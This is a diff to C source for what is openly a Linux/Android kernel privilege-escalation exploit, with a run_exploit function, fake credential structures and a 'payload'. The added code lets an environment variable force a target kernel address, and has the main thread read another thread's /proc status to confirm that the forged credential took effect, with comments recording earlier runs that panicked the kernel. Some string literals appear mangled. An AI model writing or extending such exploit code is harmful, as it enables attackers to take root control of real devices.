@@ -378,13 +378,20 @@ void *consumer_thread(void *arg __attribute__((unused))) {
        * PSELECT_GHOST_DELTA (QEMU-calibrated) gives the ghost address;
        * the /proc-syscall SP path was USER-sp (dead end, kept for
        * reference). Published here pre-arm so the final stamps carry it. */
-      if (!g_ghost_kva && g_waiter_stack_hint) {
-        long delta = env_int_range("PSELECT_GHOST_DELTA", 0, -0x2000,
-                                   0x2000);
-        g_ghost_kva =
-            (uintptr_t)((long)g_waiter_stack_hint + delta);
-        pr_info("ghost=%lx = hint%+ld (self-lock will arm)\n",
-                (unsigned long)g_ghost_kva, delta);
+      if (!g_ghost_kva) {
+        const char *fk = getenv("PSELECT_GHOST_FORCE_KVA");
+        if (fk && fk[0]) {
+          g_ghost_kva = (uintptr_t)strtoull(fk, NULL, 0);
+          pr_info("ghost=%lx FORCED (QEMU self-lock exercise)\n",
+                  (unsigned long)g_ghost_kva);
+        } else if (g_waiter_stack_hint) {
+          long delta = env_int_range("PSELECT_GHOST_DELTA", 0, -0x2000,
+                                     0x2000);
+          g_ghost_kva =
+              (uintptr_t)((long)g_waiter_stack_hint + delta);
+          pr_info("ghost=%lx = hint%+ld (self-lock will arm)\n",
+                  (unsigned long)g_ghost_kva, delta);
+        }
       }
       __asm__ volatile("yield" ::: "memory");
       continue;
@@ -724,6 +731,33 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
     if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
   run_main_route_threads();
   durable_stage("route_threads_returned");
+  /* CROSS-THREAD CapEff RENDER (run 4): the waiter (punch target) is
+   * SILENT post-select — its own readback syscalls KP'd (runs 2/3:
+   * deterministic damage = likely the cred landed). MAIN renders the
+   * waiter's status instead: CapEff=0x182082 → DELIVERED. */
+  {
+    int wt = (int)atomic_load(&waiter_tid);
+    if (wt > 0) {
+      char p[96], b[2048];
+      snprintf(p, sizeof(p), "/proc/self/task/%d/status", wt);
+      int wf = open(p, O_RDONLY | O_CLOEXEC);
+      if (wf >= 0) {
+        ssize_t wn = read(wf, b, sizeof(b) - 1);
+        close(wf);
+        if (wn > 0) {
+          b[wn] = 0;
+          char *ce = strstr(b, "CapEff:");
+          char *ud = strstr(b, "Uid:");
+          if (ce)
+            pr_info("MAIN-RENDER waiter CapEff=%.18s\n", ce + 7);
+          if (ud)
+            pr_info("MAIN-RENDER waiter Uid=%.40s\n", ud + 4);
+        }
+      } else {
+        pr_info("MAIN-RENDER waiter status open errno=%d\n", errno);
+      }
+    }
+  }
   { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
     if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
   TIMER("  PI route done");
@@ -4189,6 +4223,34 @@ int run_exploit(int argc, char **argv) {
     if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
   run_main_route_threads();
     durable_stage("route_threads_returned");
+    /* CROSS-THREAD RENDER (run 5): the waiter HOLDS post-punch (yield
+     * loop, no cred-touching syscalls) so its landed cred stays live;
+     * MAIN renders /proc/<waiter_tid>/status. CapEff=0x182082 = the
+     * delivery is REAL (runs 2/3 KP = render-on-broken-cred; run 4
+     * silent-waiter survived). */
+    {
+      int wt = (int)atomic_load(&waiter_tid);
+      if (wt > 0) {
+        char p[96], b[2048];
+        snprintf(p, sizeof(p), "/proc/self/task/%d/status", wt);
+        int wf = open(p, O_RDONLY | O_CLOEXEC);
+        if (wf >= 0) {
+          ssize_t wn = read(wf, b, sizeof(b) - 1);
+          close(wf);
+          if (wn > 0) {
+            b[wn] = 0;
+            char *ce = strstr(b, "CapEff:");
+            char *ud = strstr(b, "Uid:");
+            if (ce)
+              pr_info("MAIN-RENDER waiter CapEff=%.18s\n", ce + 7);
+            if (ud)
+              pr_info("MAIN-RENDER waiter Uid=%.40s\n", ud + 4);
+          }
+        } else {
+          pr_info("MAIN-RENDER waiter status open errno=%d\n", errno);
+        }
+      }
+    }
     /* KIMI SIGCONT: resume the frozen child — cred is now consistent
      * (both pointers = same fake cred). The child's next poll will read
      * its own CapEff and fire the payload on landing.
